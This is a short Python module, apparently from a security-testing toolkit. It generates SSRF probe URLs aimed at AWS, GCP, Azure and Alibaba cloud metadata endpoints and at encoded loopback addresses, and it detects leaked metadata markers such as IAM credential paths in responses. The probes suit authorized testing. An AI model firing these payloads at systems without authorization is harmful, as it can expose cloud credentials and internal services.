"""
SSRF probe generator.

Builds a list of URL variants targeting common SSRF sinks:
- cloud metadata endpoints (AWS / GCP / Azure / Alibaba)
- localhost / loopback variants
- private RFC1918 ranges
- DNS rebinding-style hosts

The caller plugs these into an existing HTTP task and watches for 2xx
or response bodies that contain known metadata markers.
"""

from typing import Any, Dict, List

# These are the payloads an SSRF probe sends: cloud metadata endpoints are plain-HTTP link-local
# addresses by definition, so the scheme and the fixed IPs are the point, not a mistake.
_METADATA_TARGETS = (
    "http://169.254.169.254/latest/meta-data/",  # NOSONAR S1313,S5332 — AWS metadata endpoint used as a probe payload
    "http://metadata.google.internal/computeMetadata/v1/",  # NOSONAR S5332 — GCP metadata probe payload
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # NOSONAR S1313,S5332 — Azure probe payload
    "http://100.100.100.200/latest/meta-data/",  # NOSONAR S1313,S5332 — Alibaba Cloud probe payload
)

_LOOPBACK_VARIANTS = (
    "http://127.0.0.1/",  # NOSONAR S5332 — loopback probe payload
    "http://localhost/",  # NOSONAR S5332 — loopback probe payload
    "http://0.0.0.0/",  # NOSONAR S5332 — loopback probe payload
    "http://[::1]/",  # NOSONAR S5332 — loopback probe payload
    "http://2130706433/",  # NOSONAR S5332 — decimal-encoded 127.0.0.1 probe payload
    "http://0x7f000001/",  # NOSONAR S5332 — hex-encoded loopback probe payload
    "http://127.1/",  # NOSONAR S5332 — truncated-octet loopback probe payload
)


def build_ssrf_targets() -> List[str]:
    """Return the canonical SSRF target list."""
    return list(_METADATA_TARGETS) + list(_LOOPBACK_VARIANTS)


def render_ssrf_tasks(template_task: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Clone ``template_task`` once per SSRF target with ``request_url``
    replaced and ``name`` annotated for reporting.
    """
    out: List[Dict[str, Any]] = []
    for target in build_ssrf_targets():
        copy = dict(template_task)
        copy["request_url"] = target
        copy["name"] = f"ssrf::{target}"
        out.append(copy)
    return out


def find_metadata_leak(body: str) -> List[str]:
    """Return matched marker strings if a response body looks like cloud metadata."""
    markers = [
        "ami-id", "iam/security-credentials", "instance-id",
        "computeMetadata", "metadata.google",
        "Metadata-Flavor", "x-ms-imds-instance-id",
    ]
    return [marker for marker in markers if marker.lower() in (body or "").lower()]
